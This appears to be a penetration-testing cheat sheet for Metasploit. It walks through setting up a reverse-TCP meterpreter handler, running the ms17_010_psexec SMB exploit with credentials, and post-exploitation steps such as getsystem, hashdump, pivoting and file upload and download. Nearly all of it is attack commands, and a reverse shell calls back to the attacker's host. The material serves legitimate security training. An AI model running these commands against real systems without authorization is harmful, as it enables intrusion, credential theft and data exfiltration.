## Commands

**Kali / msfconsole**

```bash
msfconsole -q
# Inside msfconsole
search smb
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 4444
run
```

The handler must exactly match the payload and callback address/port you generated.

<Accordion title="Mental model">

### Mental model

**Metasploit Framework: Startup to Sessions**

```text
Have a vuln + MSF module?  → search → use → set RHOSTS/LHOST/PAYLOAD → run
No module, but can run a file? → msfvenom payload → multi/handler to catch it
Got a session?  → sessions -i, background, sessions -u (upgrade to meterpreter)
In meterpreter? → migrate, getsystem, hashdump, local_exploit_suggester
Need the internal net? → autoroute + socks_proxy → proxychains everything else
Always: LHOST = your tun0, payload in venom must match the handler
```

</Accordion>

<Accordion title="Meterpreter — the premium payload">

### Meterpreter — the premium payload

**Metasploit Framework: Startup to Sessions**

```bash
meterpreter > sysinfo                 # OS, arch, hostname

meterpreter > background              # park the session (back to msf prompt)
```

<Accordion title="Metasploit Basic Workflow">

### Metasploit Basic Workflow

**Shells, Payloads, and Interactive TTYs**

```bash
# Start Metasploit
sudo msfconsole

# Search for exploits
msf6 > search smb
msf6 > search eternalblue

# Select a module
msf6 > use exploit/windows/smb/ms17_010_psexec

# View required options
msf6 exploit(...) > options

# Set options
msf6 exploit(...) > set RHOSTS <target_ip>
msf6 exploit(...) > set LHOST <your_ip>
msf6 exploit(...) > set LPORT 4444
msf6 exploit(...) > set SMBUser <username>
msf6 exploit(...) > set SMBPass <password>

# Run the exploit
msf6 exploit(...) > exploit

# Inside Meterpreter
meterpreter > getuid          # Check user context
meterpreter > shell           # Drop to native OS shell
meterpreter > upload <file>   # Upload file
meterpreter > download <file> # Download file
```
